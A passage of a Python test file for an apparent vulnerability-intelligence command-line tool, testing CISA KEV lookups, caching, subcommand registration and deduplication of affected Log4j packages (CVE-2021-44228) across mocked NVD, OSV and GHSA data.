        monkeypatch.setattr(_mod, "CACHE_FILE", tmp_path / ".cisa_kev_cache.json")

        with patch.object(_mod.requests, "get") as mock_get:
            mock_response = MagicMock()
            mock_response.status_code = 200
            mock_response.json.return_value = _CISA_KEV_DATA
            mock_response.raise_for_status = MagicMock()
            mock_get.return_value = mock_response

            result = _mod.check_cisa_kev(self._make_tool_use("CVE-2021-44228"))

        assert result["status"] == "success"
        content = result["content"][0]["json"]
        assert content["exploited"] is True
        assert "CVE-2021-44228" in content["summary"]
        assert "CRITICAL" in content["summary"] or "listed" in content["summary"].lower()

    def test_unlisted_cve_returns_exploited_false(self, tmp_path, monkeypatch):
        """A CVE not in KEV returns exploited=False."""
        from manus_agent.tools import check_cisa_kev as _mod

        monkeypatch.setattr(_mod, "CACHE_FILE", tmp_path / ".cisa_kev_cache.json")

        with patch.object(_mod.requests, "get") as mock_get:
            mock_response = MagicMock()
            mock_response.status_code = 200
            mock_response.json.return_value = _CISA_KEV_DATA
            mock_response.raise_for_status = MagicMock()
            mock_get.return_value = mock_response

            result = _mod.check_cisa_kev(self._make_tool_use("CVE-1999-99999"))

        assert result["status"] == "success"
        content = result["content"][0]["json"]
        assert content["exploited"] is False

    def test_kev_api_failure_returns_error(self, tmp_path, monkeypatch):
        """CISA API network failure returns error status."""
        from manus_agent.tools import check_cisa_kev as _mod

        monkeypatch.setattr(_mod, "CACHE_FILE", tmp_path / ".cisa_kev_cache.json")

        with patch.object(_mod.requests, "get", side_effect=requests.exceptions.ConnectionError("offline")):
            result = _mod.check_cisa_kev(self._make_tool_use("CVE-2021-44228"))

        assert result["status"] == "error"

    def test_kev_cache_is_used_on_second_call(self, tmp_path, monkeypatch):
        """Second call within cache window does not re-fetch from CISA."""
        from manus_agent.tools import check_cisa_kev as _mod

        monkeypatch.setattr(_mod, "CACHE_FILE", tmp_path / ".cisa_kev_cache.json")

        with patch.object(_mod.requests, "get") as mock_get:
            mock_response = MagicMock()
            mock_response.status_code = 200
            mock_response.json.return_value = _CISA_KEV_DATA
            mock_response.raise_for_status = MagicMock()
            mock_get.return_value = mock_response

            # First call primes the cache
            _mod.check_cisa_kev(self._make_tool_use("CVE-2021-44228"))
            first_call_count = mock_get.call_count

            # Second call should use cache
            _mod.check_cisa_kev(self._make_tool_use("CVE-2021-44228"))
            second_call_count = mock_get.call_count

        assert second_call_count == first_call_count  # no extra HTTP call

    def test_invalid_cve_id_returns_error(self, tmp_path, monkeypatch):
        """Empty or non-string CVE ID returns error without making HTTP calls."""
        from manus_agent.tools import check_cisa_kev as _mod

        monkeypatch.setattr(_mod, "CACHE_FILE", tmp_path / ".cisa_kev_cache.json")

        result = _mod.check_cisa_kev(self._make_tool_use(""))
        assert result["status"] == "error"

    def test_kev_details_include_vendor_product(self, tmp_path, monkeypatch):
        """KEV result includes vendor/product details from the catalog."""
        from manus_agent.tools import check_cisa_kev as _mod

        monkeypatch.setattr(_mod, "CACHE_FILE", tmp_path / ".cisa_kev_cache.json")

        with patch.object(_mod.requests, "get") as mock_get:
            mock_response = MagicMock()
            mock_response.status_code = 200
            mock_response.json.return_value = _CISA_KEV_DATA
            mock_response.raise_for_status = MagicMock()
            mock_get.return_value = mock_response

            result = _mod.check_cisa_kev(self._make_tool_use("CVE-2021-44228"))

        content = result["content"][0]["json"]
        details = content.get("details", {})
        assert details.get("vendorProject") == "Apache"
        assert details.get("product") == "Log4j2"

    def test_case_insensitive_cve_lookup(self, tmp_path, monkeypatch):
        """Lowercase cve id is uppercased before lookup."""
        from manus_agent.tools import check_cisa_kev as _mod

        monkeypatch.setattr(_mod, "CACHE_FILE", tmp_path / ".cisa_kev_cache.json")

        with patch.object(_mod.requests, "get") as mock_get:
            mock_response = MagicMock()
            mock_response.status_code = 200
            mock_response.json.return_value = _CISA_KEV_DATA
            mock_response.raise_for_status = MagicMock()
            mock_get.return_value = mock_response

            result = _mod.check_cisa_kev(self._make_tool_use("cve-2021-44228"))

        assert result["status"] == "success"
        content = result["content"][0]["json"]
        assert content["exploited"] is True


# ---------------------------------------------------------------------------
# Cross-subcommand: _SUBCOMMANDS completeness check
# ---------------------------------------------------------------------------


@pytest.mark.integration
class TestSubcommandsRegistry:
    """Verify _SUBCOMMANDS registry integrity."""

    _EXPECTED = [
        "epss-trend",
        "patch-diff",
        "compare",
        "exploit-complexity",
        "poc-search",
        "changelog",
        "blast-radius",
        "analyze",
        "variants",
        "discover",
        "remediate",
    ]

    def test_all_expected_subcommands_registered(self):
        from manus_agent.cli import _SUBCOMMANDS

        for cmd in self._EXPECTED:
            assert cmd in _SUBCOMMANDS, f"Subcommand not registered: {cmd!r}"

    def test_subcommands_are_strings(self):
        from manus_agent.cli import _SUBCOMMANDS

        for cmd in _SUBCOMMANDS:
            assert isinstance(cmd, str)
            assert len(cmd) > 0

    def test_no_duplicate_subcommands(self):
        from manus_agent.cli import _SUBCOMMANDS

        assert len(_SUBCOMMANDS) == len(set(_SUBCOMMANDS))


# ---------------------------------------------------------------------------
# Realistic full-pipeline: NVD → OSV → GHSA → Maven → text output
# ---------------------------------------------------------------------------


@pytest.mark.integration
class TestBlastRadiusFullPipeline:
    """Exercises the full data-assembly pipeline for blast-radius with
    realistic mock responses that mirror what the real APIs return."""

    def test_log4shell_full_pipeline_text(self, capsys):
        """Full pipeline: NVD + OSV + GHSA dedup, enrich Maven, sort, render."""
        from manus_agent.cli import _run_blast_radius
        from manus_agent.tools import get_dependency_blast_radius as _mod

        # NVD returns one affected config (log4j-core, via CPE)
        nvd_pkgs = [
            {
                "name": "org.apache.logging.log4j:log4j-core",
                "ecosystem": "Maven",
                "version_range": ">= 2.0-beta9, < 2.15.0",
                "source": "nvd",
            }
        ]
        # OSV returns same package — should dedup
        osv_pkgs = [
            {
                "name": "org.apache.logging.log4j:log4j-core",
                "ecosystem": "Maven",
                "version_range": ">= 2.0-beta9, < 2.15.0",
                "source": "osv",
            }
        ]
        # GHSA adds a second package (log4j-api)
        ghsa_pkgs = [
            {
                "name": "org.apache.logging.log4j:log4j-api",
                "ecosystem": "Maven",
                "version_range": ">= 2.0-beta9, < 2.15.0",
                "source": "ghsa",
            }
        ]

        def enrich_side(name, eco):
            if "log4j-core" in name:
                return {
                    "package_name": name,
                    "ecosystem": "Maven",
                    "full_id": "org.apache.logging.log4j:log4j-core",
                    "latest_version": "2.20.0",
                    "version_count": 42,
                    "dependent_packages_count": None,
                    "weekly_downloads": None,
                    "monthly_downloads": None,
                    "description": "Apache Log4j Core implementation",
                }
            return {
                "package_name": name,
                "ecosystem": "Maven",
                "full_id": "org.apache.logging.log4j:log4j-api",
                "latest_version": "2.20.0",
                "version_count": 42,
                "dependent_packages_count": None,
                "weekly_downloads": None,
                "monthly_downloads": None,
                "description": "Apache Log4j API",
            }

        with (
            patch.object(_mod, "_fetch_nvd_affected", return_value=nvd_pkgs),
            patch.object(_mod, "_fetch_osv_affected", return_value=osv_pkgs),
            patch.object(_mod, "_fetch_ghsa_affected", return_value=ghsa_pkgs),
            patch.object(_mod, "_enrich_package", side_effect=enrich_side),
        ):
            rc = _run_blast_radius(["CVE-2021-44228"])

        assert rc == 0
        out = capsys.readouterr().out
        # Dedup: only 2 unique packages (core + api), not 3
        assert "Affected packages found: 2" in out
        assert "log4j-core" in out
        assert "log4j-api" in out
        assert "Apache Log4j" in out

    def test_log4shell_full_pipeline_json_dedup(self, capsys):
        """JSON pipeline deduplicates OSV+NVD records correctly."""
        from manus_agent.cli import _run_blast_radius
        from manus_agent.tools import get_dependency_blast_radius as _mod

        pkg = {
            "name": "org.apache.logging.log4j:log4j-core",
            "ecosystem": "Maven",
            "version_range": ">= 2.0-beta9, < 2.15.0",
            "source": "nvd",
        }

        with (
            patch.object(_mod, "_fetch_nvd_affected", return_value=[pkg]),
            patch.object(_mod, "_fetch_osv_affected", return_value=[pkg]),  # duplicate
            patch.object(_mod, "_fetch_ghsa_affected", return_value=[pkg]),  # duplicate
            patch.object(_mod, "_enrich_package") as mock_enrich,
        ):
            mock_enrich.return_value = {
                "package_name": pkg["name"],
                "ecosystem": "Maven",
                "full_id": "org.apache.logging.log4j:log4j-core",
                "latest_version": "2.20.0",
                "version_count": 42,
                "dependent_packages_count": None,
                "weekly_downloads": None,
                "monthly_downloads": None,
                "description": "Apache Log4j Core",
            }

            rc = _run_blast_radius(["CVE-2021-44228", "--output", "json"])

        assert rc == 0
        data = json.loads(capsys.readouterr().out)
        # All three were the same (name+ecosystem) → deduplicated to 1
        assert data["summary"]["total_packages"] == 1
        assert mock_enrich.call_count == 1  # enrich called exactly once
